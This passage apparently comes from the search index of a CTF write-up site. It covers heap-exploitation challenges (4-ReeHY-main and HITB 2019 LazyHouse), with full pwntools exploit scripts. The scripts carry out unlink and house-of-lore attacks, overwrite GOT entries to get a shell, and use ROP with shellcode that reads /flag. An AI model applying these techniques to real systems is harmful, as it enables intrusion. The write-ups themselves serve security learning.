\u4e8e\u662f\u6211\u4eec\u7684\u6574\u4e2a\u653b\u51fb\u6d41\u7a0b\u5c31\u57fa\u672c\u786e\u5b9a\u4e0b\u6765\u4e86\uff0c\u5c31\u662f\u5148create\u4e24\u4e2asmallbin\u5927\u5c0f\u7684\u5806\u5757\u5e76\u91ca\u653e\uff0c\u4f7fsmallbin\u4e2d\u6709\u7a7a\u95f2\u5806\u5757\u3002\u7136\u540e\u91cd\u65b0\u7533\u8bf7\u8f83\u5927\u7684\u5806\u5757\uff0c\u4f2a\u9020\u5806\u5757\u5e76\u8fdb\u884cunlink\u653b\u51fb\u3002\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5148\u5c06\u4e00\u4e2a\u6307\u9488\u6539\u4e3a\u53ef\u4ee5\u4fee\u6539\u7684\u4efb\u610f\u6307\u9488\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u591a\u6b21\u5bf9\u4efb\u610f\u4f4d\u7f6e\u5199\u4e86\u3002\u6700\u540e\u6211\u4eec\u5c06free\u51fd\u6570\u5148\u6539\u4e3aputs\u51fd\u6570\u6cc4\u9732libc\u57fa\u5740\uff0c\u7136\u540e\u518d\u5c06\u5176\u6539\u4e3asystem\u51fd\u6570getshell\u3002\u5f53\u7136\u8fd9\u91cc\u9762\u8fd8\u6709\u5f88\u591a\u9700\u8981\u6ce8\u610f\u7684\u7ec6\u8282\uff0c\u8fd9\u4e9b\u4f1a\u5728exp\u4e2d\u63d0\u5230 from pwn import * context . log_level = True p = process ( ./4-ReeHY-main-100 ) #p = remote( 111.198.29.45 , 55988) elf = ELF ( 4-ReeHY-main-100 ) libc = elf . libc #gdb.attach(p, b* 0x400aa5 ) puts_plt = elf . plt [ puts ] free_got = elf . got [ free ] puts_got = elf . got [ puts ] def create ( size , cun , content ): print p . recvuntil ( $ ) p . sendline ( 1 ) print p . recvuntil ( Input size \\n ) p . sendline ( str ( size )) print p . recvuntil ( Input cun \\n ) p . sendline ( str ( cun )) print p . recvuntil ( Input content \\n ) p . sendline ( content ) def dele ( cun ): print p . recvuntil ( $ ) p . sendline ( 2 ) print p . recvuntil ( Chose one to dele \\n ) p . sendline ( str ( cun )) def edit ( cun , content ): print p . recvuntil ( $ ) p . sendline ( 3 ) print p . recvuntil ( Chose one to edit \\n ) p . sendline ( str ( cun )) print p . recvuntil ( Input the content \\n ) p . sendline ( content ) def edit2 ( cun , content ): print p . recvuntil ( $ ) p . sendline ( 3 ) print p . recvuntil ( Chose one to edit \\n ) p . sendline ( str ( cun )) print p . recvuntil ( Input the content \\n ) p . send ( content ) print p . recvuntil ( $ ) p . sendline ( b0m13 ) /* \u5148\u521b\u5efa\u597d\u201c / bin / sh \u201d\u5b57\u7b26\u4e32\u4ee5\u5f85\u540e\u9762\u4f7f\u7528 */ create ( 0x20 , 4 , /bin/sh ) create ( 0x100 , 0 , chunk0 ) #size\u8981\u5927\u4e8e0x80\uff0c\u5426\u5219\u4f1a\u5c06\u7a7a\u95f2\u5806\u5757\u52a0\u5165\u5230fastbin\u4e2d create ( 0x100 , 1 , chunk1 ) /* \u83b7\u5f97 smallbin \u4e2d\u7684\u7a7a\u95f2\u5806\u5757 */ dele ( 0 ) dele ( 1 ) /* \u6784\u9020\u4f2a\u88c5\u5806\u5757\uff0c\u5c06\u4e00\u4e2a\u6307\u9488\u6539\u4e3a\u53ef\u4ee5\u4fee\u6539\u7684\u4efb\u610f\u6307\u9488\uff0c\u6ce8\u610f\u8fd9\u91cc\u53ea\u6709\u8fd9\u4e2a\u53ef\u4ee5\uff0c\u56e0\u4e3a\u8fd8\u6709\u6807\u5fd7\u4f4d\u8981\u8003\u8651\u8fdb\u6765 */ payload1 = p64 ( 0 ) + p64 ( 0x100 ) + p64 ( 0x6020e8 ) + p64 ( 0x602100 - 0x10 ) + a * ( 0x100 - 32 ) + p64 ( 0x100 ) + p64 ( 0x110 ) create ( 0x210 , 2 , payload1 ) /* unlink \u653b\u51fb */ dele ( 1 ) /* \u8986\u76d6 free \u4e3a puts */ payload2 = p64 ( 0 ) + p64 ( puts_got ) + p64 ( 1 ) + p64 ( free_got ) + p64 ( 1 ) edit ( 2 , payload2 ) /* \u6ce8\u610f\u8fd9\u91cc \\n \u4f1a\u8986\u76d6\u540e\u9762\u7684 got \u8868\u9879\uff0c\u6240\u4ee5\u8981\u628a \\n \u53bb\u6389 */ edit2 ( 2 , p64 ( puts_plt )) dele ( 1 ) puts_addr = u64 ( p . recv ( 6 ) + \\x00 * 2 ) print puts_addr: + hex ( puts_addr ) libc_addr = puts_addr - libc . symbols [ puts ] print libc_addr: + hex ( libc_addr ) sys_addr = libc_addr + libc . symbols [ system ] print sys_addr: + hex ( sys_addr ) /* \u8986\u76d6 free \u4e3a system */ edit2 ( 2 , p64 ( sys_addr )) /* getshell */ dele ( 4 ) p . interactive ()","title":"4-ReeHY-main"},{"location":"pwn/Heap/4-ReeHY-main/#4-reehy-main","text":"\u8fd9\u9053\u9898\u76ee\u6709\u4e24\u79cd\u505a\u6cd5\uff0c\u4e00\u4e2a\u662f\u6574\u6570\u6ea2\u51fa\uff0c\u4e00\u4e2a\u662funlink\uff0c\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecdunlink\u3002","title":"4-ReeHY-main"},{"location":"pwn/Heap/4-ReeHY-main/#_1","text":"\u7a0b\u5e8f\u4e3b\u8981\u5206\u4e3a\u4e09\u5757\u4e3b\u8981\u5185\u5bb9\uff0c\u5206\u522b\u662f\u521b\u5efa\u6587\u672c\uff0c\u5220\u9664\u6587\u672c\uff0c\u7f16\u8f91\u6587\u672c\u3002\u9996\u5148\u5206\u6790create\u90e8\u5206 \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u6709\u4e00\u5904\u660e\u663e\u7684\u6574\u6570\u6ea2\u51fa\uff0c\u5229\u7528\u8fd9\u4e00\u70b9\u6211\u4eec\u53ef\u4ee5\u6784\u9020ROP\u94fe\u6cc4\u9732libc\u57fa\u5740\u5e76\u6267\u884csystem\u51fd\u6570\u3002\u4e0b\u9762\u662fexp from pwn import * #p = process( ./4-ReeHY-main-100 ) p = remote ( 111.198.29.45 , 31226 ) elf = ELF ( ./4-ReeHY-main-100 ) libc = elf . libc pop_addr = 0x0000000000400DA3 puts_plt = elf . plt [ puts ] puts_got = elf . got [ puts ] main_addr = 0x0000000000400C8C start_addr = 0x0000000000400760 gadget_sym = 0x45216 print p . recvuntil ( $ ) p . sendline ( 1234 ) print p . recvuntil ( $ ) p . sendline ( 1 ) print p . recvuntil ( Input size \\n ) p . sendline ( -1 ) print p . recvuntil ( Input cun \\n ) p . sendline ( 1 ) payload = a * 0x88 + \\x00 * 8 + a * 8 + p64 ( pop_addr ) + p64 ( puts_got ) + p64 ( puts_plt ) + p64 ( start_addr ) print p . recvuntil ( Input content \\n ) p . sendline ( payload ) data = p . recv ( numb = 6 ) data = data . ljust ( 8 , \\x00 ) data = u64 ( data ) puts_addr = data print puts_addr: + hex ( data ) libc_addr = puts_addr - libc . symbols [ puts ] print libc_addr: + hex ( libc_addr ) sys_addr = libc_addr + libc . symbols [ system ] print sys_addr: + hex ( sys_addr ) bin_addr = libc_addr + libc . search ( /bin/sh ) . next () print bin_Addr: + hex ( bin_addr ) gadget_addr = libc_addr + gadget_sym print gadget_addr: + hex ( gadget_addr ) print p . recvuntil ( $ ) p . sendline ( 1234 ) print p . recvuntil ( $ ) p . sendline ( 1 ) print p . recvuntil ( Input size \\n ) p . sendline ( -1 ) print p . recvuntil ( Input cun \\n ) p . sendline ( 1 ) payload = a * 0x88 + \\x00 * 8 + a * 8 + p64 ( pop_addr ) + p64 ( bin_addr ) + p64 ( sys_addr ) + p64 ( start_addr ) #payload = a * 0x88 + \\x00 * 8 + a * 8 + p64(gadget_addr) print p . recvuntil ( Input content \\n ) p . sendline ( payload ) p . interactive ()","title":"\u4e00\u3001\u6574\u6570\u6ea2\u51fa"},{"location":"pwn/Heap/4-ReeHY-main/#unlink","text":"\u5206\u6790\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\u5728delete\u5220\u9664\u6587\u672c\u7684\u65f6\u5019\uff0c\u5728free\u6389\u5806\u5757\u4e4b\u540e\u5e76\u6ca1\u6709\u6e05\u9664\u6389\u5730\u5740\u6570\u7ec4\u91cc\u7684\u6307\u9488 \u4e8e\u662f\u6211\u4eec\u7684\u6574\u4e2a\u653b\u51fb\u6d41\u7a0b\u5c31\u57fa\u672c\u786e\u5b9a\u4e0b\u6765\u4e86\uff0c\u5c31\u662f\u5148create\u4e24\u4e2asmallbin\u5927\u5c0f\u7684\u5806\u5757\u5e76\u91ca\u653e\uff0c\u4f7fsmallbin\u4e2d\u6709\u7a7a\u95f2\u5806\u5757\u3002\u7136\u540e\u91cd\u65b0\u7533\u8bf7\u8f83\u5927\u7684\u5806\u5757\uff0c\u4f2a\u9020\u5806\u5757\u5e76\u8fdb\u884cunlink\u653b\u51fb\u3002\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5148\u5c06\u4e00\u4e2a\u6307\u9488\u6539\u4e3a\u53ef\u4ee5\u4fee\u6539\u7684\u4efb\u610f\u6307\u9488\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u591a\u6b21\u5bf9\u4efb\u610f\u4f4d\u7f6e\u5199\u4e86\u3002\u6700\u540e\u6211\u4eec\u5c06free\u51fd\u6570\u5148\u6539\u4e3aputs\u51fd\u6570\u6cc4\u9732libc\u57fa\u5740\uff0c\u7136\u540e\u518d\u5c06\u5176\u6539\u4e3asystem\u51fd\u6570getshell\u3002\u5f53\u7136\u8fd9\u91cc\u9762\u8fd8\u6709\u5f88\u591a\u9700\u8981\u6ce8\u610f\u7684\u7ec6\u8282\uff0c\u8fd9\u4e9b\u4f1a\u5728exp\u4e2d\u63d0\u5230 from pwn import * context . log_level = True p = process ( ./4-ReeHY-main-100 ) #p = remote( 111.198.29.45 , 55988) elf = ELF ( 4-ReeHY-main-100 ) libc = elf . libc #gdb.attach(p, b* 0x400aa5 ) puts_plt = elf . plt [ puts ] free_got = elf . got [ free ] puts_got = elf . got [ puts ] def create ( size , cun , content ): print p . recvuntil ( $ ) p . sendline ( 1 ) print p . recvuntil ( Input size \\n ) p . sendline ( str ( size )) print p . recvuntil ( Input cun \\n ) p . sendline ( str ( cun )) print p . recvuntil ( Input content \\n ) p . sendline ( content ) def dele ( cun ): print p . recvuntil ( $ ) p . sendline ( 2 ) print p . recvuntil ( Chose one to dele \\n ) p . sendline ( str ( cun )) def edit ( cun , content ): print p . recvuntil ( $ ) p . sendline ( 3 ) print p . recvuntil ( Chose one to edit \\n ) p . sendline ( str ( cun )) print p . recvuntil ( Input the content \\n ) p . sendline ( content ) def edit2 ( cun , content ): print p . recvuntil ( $ ) p . sendline ( 3 ) print p . recvuntil ( Chose one to edit \\n ) p . sendline ( str ( cun )) print p . recvuntil ( Input the content \\n ) p . send ( content ) print p . recvuntil ( $ ) p . sendline ( b0m13 ) /* \u5148\u521b\u5efa\u597d\u201c / bin / sh \u201d\u5b57\u7b26\u4e32\u4ee5\u5f85\u540e\u9762\u4f7f\u7528 */ create ( 0x20 , 4 , /bin/sh ) create ( 0x100 , 0 , chunk0 ) #size\u8981\u5927\u4e8e0x80\uff0c\u5426\u5219\u4f1a\u5c06\u7a7a\u95f2\u5806\u5757\u52a0\u5165\u5230fastbin\u4e2d create ( 0x100 , 1 , chunk1 ) /* \u83b7\u5f97 smallbin \u4e2d\u7684\u7a7a\u95f2\u5806\u5757 */ dele ( 0 ) dele ( 1 ) /* \u6784\u9020\u4f2a\u88c5\u5806\u5757\uff0c\u5c06\u4e00\u4e2a\u6307\u9488\u6539\u4e3a\u53ef\u4ee5\u4fee\u6539\u7684\u4efb\u610f\u6307\u9488\uff0c\u6ce8\u610f\u8fd9\u91cc\u53ea\u6709\u8fd9\u4e2a\u53ef\u4ee5\uff0c\u56e0\u4e3a\u8fd8\u6709\u6807\u5fd7\u4f4d\u8981\u8003\u8651\u8fdb\u6765 */ payload1 = p64 ( 0 ) + p64 ( 0x100 ) + p64 ( 0x6020e8 ) + p64 ( 0x602100 - 0x10 ) + a * ( 0x100 - 32 ) + p64 ( 0x100 ) + p64 ( 0x110 ) create ( 0x210 , 2 , payload1 ) /* unlink \u653b\u51fb */ dele ( 1 ) /* \u8986\u76d6 free \u4e3a puts */ payload2 = p64 ( 0 ) + p64 ( puts_got ) + p64 ( 1 ) + p64 ( free_got ) + p64 ( 1 ) edit ( 2 , payload2 ) /* \u6ce8\u610f\u8fd9\u91cc \\n \u4f1a\u8986\u76d6\u540e\u9762\u7684 got \u8868\u9879\uff0c\u6240\u4ee5\u8981\u628a \\n \u53bb\u6389 */ edit2 ( 2 , p64 ( puts_plt )) dele ( 1 ) puts_addr = u64 ( p . recv ( 6 ) + \\x00 * 2 ) print puts_addr: + hex ( puts_addr ) libc_addr = puts_addr - libc . symbols [ puts ] print libc_addr: + hex ( libc_addr ) sys_addr = libc_addr + libc . symbols [ system ] print sys_addr: + hex ( sys_addr ) /* \u8986\u76d6 free \u4e3a system */ edit2 ( 2 , p64 ( sys_addr )) /* getshell */ dele ( 4 ) p . interactive ()","title":"\u4e8c\u3001unlink"},{"location":"pwn/Heap/LazyHouse/","text":"LazyHouse HITB Qual 2019 Vulnerability Type Confusion The value of (int64_t size) is cast to uint64 , and the high bits (higher than 64) of the result of imul can be ignored. For Example, if we enter a value 0x13f69b02593f69b1 as size of a house. We can make the result of imul to be very small, which is the money we need to pay for the house. After that, if we sell the house, we will get as much money as size 6 . In one word, we enter a size for house and then sell the house, we will get as much money as -((uint64_t)(size * 0xda) 0xffffffffffffffff) + (uint64_t)(size 6) . We fraudulently obtain money without paying anything~ Heap Overflow Only twice We can make a 32 bytes heap overflow when we upgrade a house. Diffifulty Calloc We can only buy a normal house and get a chunk allocated buy function calloc . If we want to use malloc, we need to buy a super house . The differences between malloc and calloc are shown as follows. - calloc will not use tcache bins for allocation. For __libc_malloc For __libc_calloc And, _int_malloc will directly search fastbins for allocating rather than searching tcache bins firstly. calloc will zero the memory got from __int_malloc . Glibc 2.29 Glibc2.28 disallowed unsotedbin attack for arbitrary address writing. So, it is not easy to overwrite global_max_fast to fuck chunks and bins of any size into the range of fastbins. Glibc2.29 disallowed house of force . Exploit Get Enough Money I play the trick mentioned before to get the money close to 0xffffffffffffffff for further exploiting. def fuck_money(size): buy_house(7, size, \\x00 ) sell(7) log.critical(hex(check_money())) fuck_money(0x13f69b02593f69b1) fuck_money(0x109bb0727572e2bd) fuck_money(0x13f2b1389a662c33) fuck_money(0x4fcace18cee3091) Leak If we want to make the address of libc appear in heap, we should make the tcache bins of our size full. It is great that calloc does not obtain bin from tcache bins. So, we can do buy and sell operation for more then 7 times to fill tcache bins of our size up. make tcache size 0x217 full or i in range(0, 7): buy_house(7, 0x217, \\x00 ) sell(7) buy_house(2, 0x80, x * 0x10) sell(2) buy_house(0, 0x400, \\xaa * 0x400) buy_house(1, 0xa0, \\xbb * 0xa0) buy_house(2, 0x90, \\xcc * 0x90) buy_house(3, 0x90, \\xdd * 0x90) The distribution of the chunks is shown as follows. Then, I use house 0 to make the overflow to overwrite the size of the chunk at 0x15d0 to 0x8d1 . #overlapping first upgrade(0, \\xaa * 0x400 + p64(0) + p64(0x8d1)) for i in range(0, 7): buy_house(7, 0x90, \\x11 * 0x90) sell(7) Then, I fill the tcache of size (0x90 + 0x10) up, and I make 4 chunk of this size, which will be free into unsorted bins. for i in range(0, 7): buy_house(7, 0x90, \\x11 * 0x90) sell(7) #unsorted bin buy_house(4, 0x90, \\x44 * 0x90) buy_house(5, 0x90, \\x55 * 0x90) buy_house(6, 0x90, \\x66 * 0x90) buy_house(7, 0x90, \\x77 * 0x90) Than, I free the chunk(the size of which is overwrite with 0x8d1) at 0x15d0. So a big unsorted bin is list. sell(1) Then, I calloc the chunk of (0x8d0 - 0x10) to get the chunk again. Which is the most import is that, we then free the chunk of house 4 and house 6 to make them into unsorted bins. buy_house(1, 0x8c0, \\xbb * 0xa0 + p64(0) + p64(0xa1) + \\xcc * 0x90 + p64(0) + p64(0xa1) + \\xdd * 0x90 + (p64(0) + p64(0xa1) + \\x11 * 0x90) * 7 + p64(0) + p64(0xa1) + \\x44 * 0x90 + p64(0) + p64(0xa1) + \\x55 * 0x90 + p64(0) + p64(0xa1) + \\x66 * 0x90 + p64(0) + p64(0xa1) + \\x77 * 0x90 ) #pause() sell(4) sell(6) And show house 1 to get heap address and libc address . #leak show_house(1, reading = False) for i in range(0, 10): ru(p64(0xa1)) leaked_libc = u64(p.read(8)) leaked_heap = u64(p.read(8)) libc_base = leaked_libc - 0x1e4ca0 heap_base = leaked_heap - 0x1d60 log.critical( libc_base -- {} .format(hex(libc_base))) log.critical( heap_base -- {} .format(hex(heap_base))) House of Lore I use house of lore to fuck the tcache struct in heap range to reach the goal of arbitrary writing. Firstly, I sell the bit chunk and buy the chunk to change the value overlapped by this chunk. This is really usefull in the consistance that we can only upgrade houses for twice. By modifying chunks, we can make the change the size of the chunk of house 2 to 0x21 and the size of the chunk of house 7 to 0x31. sell(1) buy_house(1, 0x8c0, \\xbb * 0xa0 + p64(0) + p64(0x21) + \\xcc * 0x10 + p64(0) + p64(0xa1 - 0x20) + \\x00 * (0x90 - 0x20) + p64(0) + p64(0xa1) + \\xdd * 0x90 + (p64(0) + p64(0xa1) + \\x11 * 0x90) * 7 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d40 - 0x10) + p64(heap_base + 0x1d60) + \\x44 * 0x80 + p64(0) + p64(0x21) + \\x55 * 0x10 + p64(0) + p64(0xa1 - 0x20) + \\x00 * (0x90 - 0x20) + p64(0) + p64(0xa1) + p64(heap_base + 0x1c20) + p64(libc_base + 0x1e4d40 - 0x10) + \\x66 * 0x80 + p64(0) + p64(0x31) + p64(heap_base + 0x40) * 4 + p64(0) + p64(0xa1 - 0x30) + \\x00 * (0x90 - 0x30) ) #prepare for house of lore sell(2) sell(7) sell(1) After we free the chunk of house 2 and the chunk of house 7 , we get 2 bin pointer at heap_base + 0x50, which is quite useful for house of lore attack. We sell the chunk of house 1 , that big chunk, for further making a small bin at the address of that 0x21 tcache chunk. (The pointer in tcache struct is chunk + 0x10 ) We buy a chunk, the size of which is (0xb0 + 0x10), to make the top chunk start at the address of that 0x21 tcache bin. GREAT~ buy_house(1, 0xb0, \\x11 * 0xb0) Obtain the small bin in smallbins to clean the smallbins. buy_house(2, 0x90, \\x22 * 0x90) Obtain a size of 0x220 at the address of that 0x21 tcache bin. buy_house(6, 0x217, \\x66 * 0x90) So, it is good for the check for smallbins list. p- BK- prev == p . We then get a smallbin chunk to avoid being merging with top_chunk. buy_house(4, 0x217, \\x44 * 0x90) A great trick. We calloc a (0x3a0 + 0x10) size chunk and free it into tcache to make the bitmap to be 0x100. It is really usefull for this challenge, since we can only use calloc , we need to zero memory with the size of the fake chunk (0 is really not good). buy_house(6, 0x3a0, p64(heap_base + 0x40) * (0x3a0 / 8)) sell(6) Then we make the second overflow to do house of lore attack, modify p- bk to fake_chunk . upgrade(1, \\x22 * 0xb0 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d30) + p64(heap_base + 0x40)) Which is still important is that we need to make p- bk- bk- prev == p- bk . Do you remember that we have a tcache bin of 0x30? Good. We just need to set the fd of that chunk to be heap_base + 0x40 . The great trick of setting bitmap to 0x100 has aslo meet that requirement. buy_house(6, 0x3a0, p64(heap_base + 0x40) * (0x3a0 / 8)) At last, we just need to calloc the modified bin out and then we will get the chunk at heap_base + 0x40 , which is the struct of tcache. We can change the header of the tcache bin list whose size is 0x220 to __calloc_hook and buy a big house (use malloc). We can make ROP_CHAIN when we buy the house. It is interesting that when we call __calloc_hook , the register rbp is the same value as size. So, we change __calloc_hook to a Gadget leave; ret to do ROP at the ROP_CHAIN by calloc( heap_chunk + ?). EXP from pwn import * local=1 pc= ./lazyhouse aslr=True context.log_level= debug context.word_size = 64 context.os = linux context.endian = little libc=ELF( ./libc.so.6 ) if local==1: #p = process(pc,aslr=aslr,env={ LD_PRELOAD : ./ld-linux-x86-64.so.2 , LD_LIBRARY_PATH : ./ }) p = process(pc,aslr=aslr) #gdb.attach(p, b malloc_printerr ) else: remote_addr=[ 6.6.6.6 , 6666] p=remote(remote_addr[0],remote_addr[1]) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a,b) def lg(s,addr): print( \\033[1;31;40m%20s-- 0x%x\\033[0m %(s,addr)) def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, \\x00 )) else: return u64(rl().strip( \\n ).ljust(8, \\x00 )) def buy_house(index, size, buf, logging = False): ru( Your choice: ) log.info( target price -- {price} .format(price = hex(size * 0xDA 0xffffffffffffffff))) sl( 1 ) ru( Your money: ) money_now = int(rl().strip()) log.info( money_now -- {money_now} .format(money_now = hex(money_now))) ru( Index: ) sl(str(index)) ru( Size: ) sl(str(size)) ru( Price: ) log.info( price -- {price} .format(price = hex(int(rl().strip())))) if logging == True: return if(p.read(6) != House: ): rl() log.critical( fucked a really big house ) return sn(buf) def show_house(index, reading = True): ru( Your choice: ) sl( 2 ) ru( Index: ) sl(str(index)) if reading == True: return ru( $$$$$$$$$$$$$$$$$$$$$$$$$$$$ )[:-len( $$$$$$$$$$$$$$$$$$$$$$$$$$$$ )] def upgrade(index, buf): ru( Your choice: ) sl( 4 ) ru( Index: ) sl(str(index)) ru( House: ) sn(buf) def sell(index): ru( Your choice: ) sl( 3 ) ru( Index: ) sl(str(index)) def check_money(): ru( Your choice: ) sl( 1 ) ru( Your money: ) money_now = int(rl().strip()) #log.critical( money_now -- {money} .format(money = hex(money_now))) ru( Index: ) sl( 7 ) ru( Size: ) sl(str(0x10)) #log.critical( max calloc -- {money} .format(money = hex(money_now / 0xda))) return money_now def buy_super(buf): ru( Your choice: ) sl( 5 ) ru( House: ) sn(buf) def show_super(): ru( Your choice: ) sl( 6 ) ru( Here is supper house:\\n ) return p.read(0x217) def fuck_money(size): buy_house(7, size, \\x00 ) sell(7) log.critical(hex(check_money())) if __name__ == __main__ : fuck_money(0x13f69b02593f69b1) fuck_money(0x109bb0727572e2bd) fuck_money(0x13f2b1389a662c33) fuck_money(0x4fcace18cee3091) #make tcache size 0x217 full for i in range(0, 7): buy_house(7, 0x217, \\x00 ) sell(7) #chunk after tcache and before tmp tcache bins buy_house(2, 0x80, x * 0x10) sell(2) buy_house(0, 0x400, \\xaa * 0x400) buy_house(1, 0xa0, \\xbb * 0xa0) buy_house(2, 0x90, \\xcc * 0x90) buy_house(3, 0x90, \\xdd * 0x90) #overlapping first upgrade(0, \\xaa * 0x400 + p64(0) + p64(0x8d1)) for i in range(0, 7): buy_house(7, 0x90, \\x11 * 0x90) sell(7) #unsorted bin buy_house(4, 0x90, \\x44 * 0x90) buy_house(5, 0x90, \\x55 * 0x90) buy_house(6, 0x90, \\x66 * 0x90) buy_house(7, 0x90, \\x77 * 0x90) #a big chunk sell(1) #pause() buy_house(1, 0x8c0, \\xbb * 0xa0 + p64(0) + p64(0xa1) + \\xcc * 0x90 + p64(0) + p64(0xa1) + \\xdd * 0x90 + (p64(0) + p64(0xa1) + \\x11 * 0x90) * 7 + p64(0) + p64(0xa1) + \\x44 * 0x90 + p64(0) + p64(0xa1) + \\x55 * 0x90 + p64(0) + p64(0xa1) + \\x66 * 0x90 + p64(0) + p64(0xa1) + \\x77 * 0x90 ) #pause() sell(4) sell(6) #leak show_house(1, reading = False) for i in range(0, 10): ru(p64(0xa1)) leaked_libc = u64(p.read(8)) leaked_heap = u64(p.read(8)) libc_base = leaked_libc - 0x1e4ca0 heap_base = leaked_heap - 0x1d60 log.critical( libc_base -- {} .format(hex(libc_base))) log.critical( heap_base -- {} .format(hex(heap_base))) sell(1) #pause() buy_house(1, 0x8c0, \\xbb * 0xa0 + p64(0) + p64(0x21) + \\xcc * 0x10 + p64(0) + p64(0xa1 - 0x20) + \\x00 * (0x90 - 0x20) + p64(0) + p64(0xa1) + \\xdd * 0x90 + (p64(0) + p64(0xa1) + \\x11 * 0x90) * 7 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d40 - 0x10) + p64(heap_base + 0x1d60) + \\x44 * 0x80 + p64(0) + p64(0x21) + \\x55 * 0x10 + p64(0) + p64(0xa1 - 0x20) + \\x00 * (0x90 - 0x20) + p64(0) + p64(0xa1) + p64(heap_base + 0x1c20) + p64(libc_base + 0x1e4d40 - 0x10) + \\x66 * 0x80 + p64(0) + p64(0x31) + p64(heap_base + 0x40) * 4 + p64(0) + p64(0xa1 - 0x30) + \\x00 * (0x90 - 0x30) ) #prepare for house of lore sell(2) sell(7) sell(1) buy_house(1, 0xb0, \\x11 * 0xb0) buy_house(2, 0x90, \\x22 * 0x90) buy_house(6, 0x217, \\x66 * 0x90) buy_house(4, 0x217, \\x44 * 0x90) sell(6) #set bitmap to 0x100 buy_house(6, 0x3a0, p64(heap_base + 0x40) * (0x3a0 / 8)) sell(6) pause() #house of lore upgrade(1, \\x22 * 0xb0 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d30) + p64(heap_base + 0x40)) libc.address = libc_base malloc_hook = libc.symbols[ __malloc_hook ] mprotect = libc.symbols[ mprotect ] leave_ret = libc_base + 0x0000000000058373 pop_rdi_ret = libc_base + 0x0000000000026542 pop_rsi_ret = libc_base + 0x0000000000026f9e pop_rdx_ret = libc_base + 0x000000000012bda6 call_rdx = libc_base + 0x0000000000143650 ROP_CHAIN = p64(pop_rdi_ret) + p64(heap_base) + \\ p64(pop_rsi_ret) + p64(0x4000) + \\ p64(pop_rdx_ret) + p64(7) + p64(mprotect) + \\ p64(pop_rdx_ret) + p64(heap_base + 0x1780) + p64(call_rdx) ROP_CHAIN = ROP_CHAIN.ljust(0x1700 - 0x16a0, \\x90 ) ROP_CHAIN += /flag\\0 ROP_CHAIN = ROP_CHAIN.ljust(0x1780 - 0x16a0, \\x90 ) buffer_addr = heap_base + 0x1700 heap_addr = heap_base + 0x2000 code = asm(pwnlib.shellcraft.amd64.linux.open(buffer_addr, 0, 2).replace( push SYS_open , push 2 )) code += asm(pwnlib.shellcraft.amd64.linux.syscall( SYS_read , rax , heap_addr, 0x100)) code += asm(pwnlib.shellcraft.amd64.linux.syscall( SYS_write , 1 , heap_addr, 0x100).replace( push SYS_write , push 1 )) code += asm(pwnlib.shellcraft.amd64.linux.syscall( SYS_exit , 0)) ROP_CHAIN += code buy_house(6, 0x217, ROP_CHAIN) buy_house(7, 0x217, p64(malloc_hook) * 0x40) buy_super(p64(leave_ret) * 2) sell(1) buy_house(1, heap_base + 0x16a0 - 8, ROP_CHAIN, logging = True) p.interactive()","title":"LazyHouse"},{"location":"pwn/Heap/LazyHouse/#lazyhouse","text":"HITB Qual 2019","title":"LazyHouse"},{"location":"pwn/Heap/LazyHouse/#vulnerability","text":"","title":"Vulnerability"},{"location":"pwn/Heap/LazyHouse/#type-confusion","text":"The value of (int64_t size) is cast to uint64 , and the high bits (higher than 64) of the result of imul can be ignored. For Example, if we enter a value 0x13f69b02593f69b1 as size of a house. We can make the result of imul to be very small, which is the money we need to pay for the house. After that, if we sell the house, we will get as much money as size 6 . In one word, we enter a size for house and then sell the house, we will get as much money as -((uint64_t)(size * 0xda) 0xffffffffffffffff) + (uint64_t)(size 6) . We fraudulently obtain money without paying anything~","title":"Type Confusion"},{"location":"pwn/Heap/LazyHouse/#heap-overflow","text":"Only twice We can make a 32 bytes heap overflow when we upgrade a house.","title":"Heap Overflow"},{"location":"pwn/Heap/LazyHouse/#diffifulty","text":"","title":"Diffifulty"},{"location":"pwn/Heap/LazyHouse/#calloc","text":"We can only buy a normal house and get a chunk allocated buy function calloc . If we want to use malloc, we need to buy a super house . The differences between malloc and calloc are shown as follows. - calloc will not use tcache bins for allocation. For __libc_malloc For __libc_calloc And, _int_malloc will directly search fastbins for allocating rather than searching tcache bins firstly. calloc will zero the memory got from __int_malloc .","title":"Calloc"},{"location":"pwn/Heap/LazyHouse/#glibc-229","text":"Glibc2.28 disallowed unsotedbin attack for arbitrary address writing. So, it is not easy to overwrite global_max_fast to fuck chunks and bins of any size into the range of fastbins. Glibc2.29 disallowed house of force .","title":"Glibc 2.29"},{"location":"pwn/Heap/LazyHouse/#exploit","text":"","title":"Exploit"},{"location":"pwn/Heap/LazyHouse/#get-enough-money","text":"I play the trick mentioned before to get the money close to 0xffffffffffffffff for further exploiting. def fuck_money(size): buy_house(7, size, \\x00 ) sell(7) log.critical(hex(check_money())) fuck_money(0x13f69b02593f69b1) fuck_money(0x109bb0727572e2bd) fuck_money(0x13f2b1389a662c33) fuck_money(0x4fcace18cee3091)","title":"Get Enough Money"},{"location":"pwn/Heap/LazyHouse/#leak","text":"If we want to make the address of libc appear in heap, we should make the tcache bins of our size full. It is great that calloc does not obtain bin from tcache bins. So, we can do buy and sell operation for more then 7 times to fill tcache bins of our size up. make tcache size 0x217 full or i in range(0, 7): buy_house(7, 0x217, \\x00 ) sell(7) buy_house(2, 0x80, x * 0x10) sell(2) buy_house(0, 0x400, \\xaa * 0x400) buy_house(1, 0xa0, \\xbb * 0xa0) buy_house(2, 0x90, \\xcc * 0x90) buy_house(3, 0x90, \\xdd * 0x90) The distribution of the chunks is shown as follows. Then, I use house 0 to make the overflow to overwrite the size of the chunk at 0x15d0 to 0x8d1 . #overlapping first upgrade(0, \\xaa * 0x400 + p64(0) + p64(0x8d1)) 